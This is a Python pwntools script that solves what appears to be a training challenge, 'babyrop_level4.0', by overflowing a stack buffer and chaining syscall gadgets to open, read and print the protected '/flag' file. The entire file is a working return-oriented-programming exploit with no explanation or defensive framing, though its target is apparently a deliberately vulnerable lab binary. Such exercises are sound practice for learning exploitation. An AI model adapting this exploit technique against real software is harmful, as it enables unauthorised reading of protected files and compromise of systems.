from pwn import *

# Init
elf = ELF("/challenge/babyrop_level4.0")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 44 + 4 + 8 # local_38 and variable int 4 byte (local_c) + EBP
io.recvuntil("at:")
buffer_addr = io.recvline()[1:15].decode()
buffer_addr = p64(int(buffer_addr, 16))

syscall_gadget = p64(0x0000000000401e0a)
set_rdi_registry_gadget = p64(0x0000000000401e32)
set_rsi_registry_gadget = p64(0x0000000000401e42)
set_rdx_registry_gadget = p64(0x0000000000401e13)
set_rax_registry_gadget = p64(0x0000000000401e22)
#push_rax_registry_gadget = p64(0x0000000000401209)

# Payload
payload = b"/flag" + b"\x00" + b"A"*(buffer_length - 6) + set_rax_registry_gadget + p64(0x3) + set_rdi_registry_gadget + p64(0x0) + syscall_gadget +set_rax_registry_gadget + p64(0x2)
payload += set_rdi_registry_gadget + buffer_addr + set_rsi_registry_gadget + p64(0x0) + set_rdx_registry_gadget + p64(0x0) + syscall_gadget
payload += set_rax_registry_gadget + p64(0x0) + set_rdi_registry_gadget + p64(0x0) + set_rsi_registry_gadget + buffer_addr + set_rdx_registry_gadget + p64(0x38) + syscall_gadget
payload += set_rax_registry_gadget + p64(0x1) + set_rdi_registry_gadget + p64(0x1) + set_rsi_registry_gadget + buffer_addr + set_rdx_registry_gadget + p64(0x38) + syscall_gadget 

# Action
io.sendline(payload)
io.interactive()